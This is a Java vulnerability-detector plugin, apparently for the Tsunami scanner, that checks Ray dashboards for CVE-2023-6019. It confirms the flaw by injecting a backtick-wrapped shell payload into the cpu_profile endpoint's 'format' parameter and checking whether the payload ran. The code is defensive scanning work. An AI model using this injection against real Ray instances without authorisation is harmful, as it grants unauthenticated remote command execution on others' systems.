/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.cve20236019;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A VulnDetector plugin for CVE 20236019. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2023-6019 Detector",
    version = "0.1",
    description = "Checks for occurrences of CVE-2023-6019 in ray installations.",
    author = "Viviana Sutedjo (vsutedjo@google.com)",
    bootstrapModule = Cve20236019DetectorModule.class)
@ForWebService
public final class Cve20236019Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve20236019Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient =
        checkNotNull(httpClient, "HttpClient cannot be null.")
            .modify()
            .setFollowRedirects(false)
            .build();
    this.payloadGenerator = checkNotNull(payloadGenerator, "PayloadGenerator cannot be null.");
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    return isRayInstance(networkService) && isRceExecutable(networkService);
  }

  private boolean isRayInstance(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    var request = HttpRequest.get(targetUri).withEmptyHeaders().build();
    try {
      HttpResponse response = httpClient.send(request);
      return response.status().isSuccess()
          && response
              .bodyString()
              .map(body -> body.contains("<title>Ray Dashboard</title>"))
              .orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
  }

  private boolean isRceExecutable(NetworkService networkService) {
    Payload payload = generatePayload();
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "worker/cpu_profile?pid=1&duration=5&native=0&format=`"
            + payload.getPayload()
            + "`";
    var request = HttpRequest.get(targetUri).withEmptyHeaders().build();

    try {
      var response = this.httpClient.send(request, networkService);
      return payload.checkIfExecuted(response.bodyBytes());

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private Payload generatePayload() {
    return this.payloadGenerator.generateNoCallback(
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build());
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE-2023-6019"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2023-6019")
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-6019"))
                .setDescription(
                    "A command injection exists in Ray's cpu_profile URL parameter allowing"
                        + " attackers to execute os commands on the system running the ray"
                        + " dashboard remotely without authentication.")
                .setRecommendation("Upgrade Ray to version 2.8.0. or later."))
        .build();
  }
}
